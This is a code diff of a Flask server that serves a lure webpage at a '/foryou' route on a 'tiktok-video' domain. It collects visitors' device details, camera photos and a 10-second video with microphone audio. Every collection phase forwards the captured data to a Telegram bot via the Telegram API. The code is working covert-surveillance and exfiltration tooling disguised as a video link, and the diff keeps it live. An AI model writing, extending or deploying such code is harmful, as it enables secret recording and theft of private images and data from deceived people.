@@ -1,8 +1,6 @@
 from flask import Flask, request, jsonify, send_from_directory
 from flask_cors import CORS
-import requests
-import base64
-import os
+import requests, base64, os
 
 app = Flask(__name__)
 CORS(app)
@@ -31,24 +29,21 @@ def collect():
 🔋 {bat.get('level','?')} | 📶 {con.get('type','?')}"""
         try:
             requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage', json={'chat_id': TELEGRAM_CHAT_ID, 'text': msg})
-        except:
-            pass
+        except: pass
 
     elif phase == 'phase2':
         if data.get('photo'):
             try:
                 b = base64.b64decode(data['photo'].split(',')[1])
                 requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto', data={'chat_id': TELEGRAM_CHAT_ID, 'caption': '📸 Photo Taken'}, files={'photo': ('photo.jpg', b, 'image/jpeg')})
-            except:
-                pass
+            except: pass
 
     elif phase == 'phase3':
         if data.get('video'):
             try:
                 v = base64.b64decode(data['video'].split(',')[1])
-                requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVideo', data={'chat_id': TELEGRAM_CHAT_ID, 'caption': '🎥 10 Second Recording'}, files={'video': ('recording.webm', v, 'video/webm')})
-            except:
-                pass
+                requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVideo', data={'chat_id': TELEGRAM_CHAT_ID, 'caption': '🎥 10s Recording with Mic'}, files={'video': ('recording.webm', v, 'video/webm')})
+            except: pass
 
     return jsonify({'status': 'ok'})
 
@@ -58,10 +53,6 @@ def collect():
 @app.route('/foryou')
 def index():
     return send_from_directory('.', 'webpage.html')
-
-@app.route('/collector.js')
-def js():
-    return send_from_directory('.', 'collector.js')
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
@@ -82,8 +73,7 @@ def webhook():
 
 @app.route('/setup_webhook')
 def setup_webhook():
-    webhook_url = "https://tiktok-video-production.up.railway.app/webhook"
-    r = requests.get(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook?url={webhook_url}')
+    r = requests.get(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook?url=https://tiktok-video-production.up.railway.app/webhook')
     return jsonify(r.json())
 
 if __name__ == '__main__':
